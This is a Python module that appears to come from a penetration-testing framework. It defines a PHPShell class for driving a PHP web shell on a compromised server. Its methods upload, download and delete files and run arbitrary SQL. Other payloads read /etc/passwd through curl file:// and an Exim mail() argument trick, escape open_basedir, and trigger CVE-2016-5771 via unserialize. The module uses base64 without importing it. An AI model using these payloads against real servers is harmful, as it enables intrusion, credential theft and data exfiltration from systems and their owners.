from saker.core.sess import Sess


class PHPShell(Sess):

    def shell(self, cmd):
        raise Exception("implement here")

    def writeFile(self, filePath, uploadPath):
        # encode file
        with open(uploadPath, "rb") as fh:
            content = fh.read()
        content = base64.b64encode(content).decode()
        cmd = "echo file_put_contents('%s', base64_decode('%s'));" % (filePath, content)
        self.shell(cmd)

    def saveFile(self, filePath, savepath=None):
        cmd = "echo file_get_contents('%s');" % filePath
        self.shell(cmd)
        if savepath is None:
            return
        with open(savepath, "wb") as fh:
            fh.write(self.lastr.content)

    def unlink(self, filePath):
        code = "unlink('%s');" % filePath
        self.shell(code)

    def createZip(self, zipPath, filePath):
        # for download some big file
        code = """
$f = "%s";
$z = "%s";
$zip = new ZipArchive();
$zip->open($z, ZipArchive::CREATE);
$zip->addFile($f, basename($f));
$zip->close();
""" % (filePath, zipPath)
        self.shell(code)

    def scandir(self, cdir):
        code = """
function fSize($bytes) {
  if ($bytes >= 1073741824) {
    $bytes = number_format($bytes / 1073741824, 2) . ' GB';
  } elseif ($bytes >= 1048576) {
    $bytes = number_format($bytes / 1048576, 2) . ' MB';
  } elseif ($bytes >= 1024) {
    $bytes = number_format($bytes / 1024, 2) . ' KB';
  } else {
    $bytes = $bytes . ' byte';
  }
  return $bytes;
}
$dir = "%s";
foreach (scandir($dir) as $file) {
  if (in_array($file, [".", ".."])) {
    continue;
  }
  $filename = $dir . "/" . $file;
  $info = stat($filename);
  $mod = substr(sprintf('%%o', fileperms($filename)), -4);;
  if (is_dir($filename)) {
      echo $mod . "\t" . $info["uid"] . "\t" . $file . "\n";
  } else {
      echo $mod . "\t" . $info["uid"] . "\t" . $file . "\t" . fSize($info["size"]) . "\n";
  }
}
""" % cdir
        self.shell(code)

    def mkdir(self, filePath):
        code = "mkdir('%s');" % filePath
        self.shell(code)

    def rmdir(self, filePath):
        code = "rmdir('%s');" % filePath
        self.shell(code)

    def doCurl(self):
        code = """
$ch = curl_init();
$url = "file:///etc/passwd";
curl_setopt($ch, CURLOPT_URL, $url);
curl_exec($ch);
curl_close($ch);
"""
        self.shell(code)

    def doSQL(self, sql):
        code = """
$host = "localhost";
$user = "user";
$pass = "pass";
$dbname = "database";
$con = mysqli_connect($host, $user, $pass);
$con->select_db($dbname);

$arr = [];
$sql = "%s";
$result = $con->query($sql);
while ($tmp = $result->fetch_array(MYSQLI_ASSOC)) {
    $arr[] = $tmp;
}
echo json_encode($arr);
""" % sql
        self.shell(code)

    def bypass(self):
        # open basedir bypass
        code = """
chdir('/tmp');
ini_set('open_basedir','/tmp');
mkdir('.sub');
chdir('.sub');
ini_set('open_basedir','..');
chdir('..');chdir('..');
chdir('..');chdir('..');
chdir('..');chdir('..');
ini_set('open_basedir','/');
var_dump(scandir('/'));
"""
        return code

    def eximBypass(self):
        code = """
mail("","","",""," -C/etc/passwd -X/tmp/result");
"""
        self.shell(code)

    def cve_2016_5771(self):
        code = """
$s = 'a:1:{i:1;C:11:"ArrayObject":37:{x:i:0;a:2:{i:1;R:4;i:2;r:1;};m:a:0:{}}}';
$o = unserialize($s);
gc_collect_cycles();
$f1 = "aaaa";
$f2 = "bbbb";
var_dump($o);
"""
        self.shell(code)
